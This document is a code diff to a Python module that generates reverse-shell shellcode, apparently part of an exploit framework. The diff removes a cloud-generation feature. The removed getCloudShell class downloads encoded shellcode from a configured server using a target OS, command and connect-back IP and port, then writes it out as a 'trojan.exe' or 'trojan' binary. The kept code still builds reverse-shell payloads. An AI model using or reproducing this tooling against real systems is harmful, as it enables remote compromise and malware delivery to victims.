@@ -6,7 +6,6 @@ import base64
 
 east_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "../")
 sys.path.append(east_path)
-from config import CLOUD_SERVER
 from platform import system, architecture
 from ShellcodeGenerator import ShellGenerator
 from Encoders import *
@@ -43,7 +42,7 @@ class OSShellcodes:
         return
 
     def create_shellcode(self, _shellcode_type='reverse', command='calc.exe', message='', encode=None, make_exe=0,
-                         debug=0, filename="", dll_inj_funcs=[], cloud_generate=False, shell_args={},
+                         debug=0, filename="", dll_inj_funcs=[], shell_args={},
                          use_precompiled=True):
         """
         Function for create shellcode.
@@ -58,14 +57,6 @@ class OSShellcodes:
         :param cloud_generate (bool) Used for generate shellcode on cloud server.
         :return: (string) Generated shellcode.
         """
-        if cloud_generate:
-            encode = 0 if encode == None else encode
-            s = getCloudShell(self.OS_TARGET, self.OS_TARGET_ARCH,
-                              self.BADCHARS, _shellcode_type, make_exe, encode,
-                              self.CONNECTBACK_IP, self.CONNECTBACK_PORT, command)
-            shellcode = s.get_shell()
-            return shellcode if not make_exe else s
-
         generator = ShellGenerator(self.OS_TARGET, self.OS_TARGET_ARCH)
         shellcode, self.binary_path = generator.get_shellcode(_shellcode_type,
                                                               connectback_ip=self.CONNECTBACK_IP,
@@ -135,61 +126,6 @@ class CrossOSShellcodes:
             return ""
         shellcode = shell.get_shellcode(inline)
         return shellcode
-
-
-class getCloudShell:
-    def __init__(self, os="WINDOWS", arch="64bit", badchars="",
-                 type_sh="reverse", make_exe=False, encode=0, ip="127.0.0.1", port=4000,
-                 command="calc.exe"):
-        # change CLOUD_SERVER in config.py
-        self.cloud_server = CLOUD_SERVER
-        self.make_exe = make_exe
-        bs = self.badchars_encoding(badchars) if len(badchars) else ""
-        self.os = os
-        self.url = self.cloud_server + "/shell?os=" + os + "&arch=" + arch
-        self.url += "&type=" + type_sh + "&command=" + command
-        self.url += "&ip=" + ip + "&port=" + str(port)
-        self.url += "&encode=" + str(encode) + "&exe=" + str(make_exe)
-        self.url += "&badchars=" + bs.encode('string_escape') if len(bs) else ""
-        return
-
-    def get_shell(self):
-        import urllib2
-        try:
-            shell = urllib2.urlopen(self.url).read()
-            shell = base64.b64decode(shell)
-        except Exception as e:
-            print(e)
-            print("Couldn't open url %s" % self.cloud_server)
-            return False
-        if self.make_exe and self.os == "WINDOWS":
-            try:
-                f = open('trojan.exe', 'wb')
-                f.write(shell)
-                f.close()
-                self.filename = "trojan.exe"
-                return True
-            except Exception as e:
-                return False
-        elif self.make_exe:
-            try:
-                f = open('trojan', 'ab')
-                f.write(shell)
-                f.close()
-                self.filename = "trojan"
-                return True
-            except Exception as e:
-                return False
-        return shell if shell else False
-
-    def get_exe_path(self):
-        return self.filename if self.filename else False
-
-    def badchars_encoding(self, badchars):
-        return_value = ""
-        for i in badchars:
-            return_value += str(ord(i)) + ";"
-        return return_value
 
 
 if __name__ == "__main__":
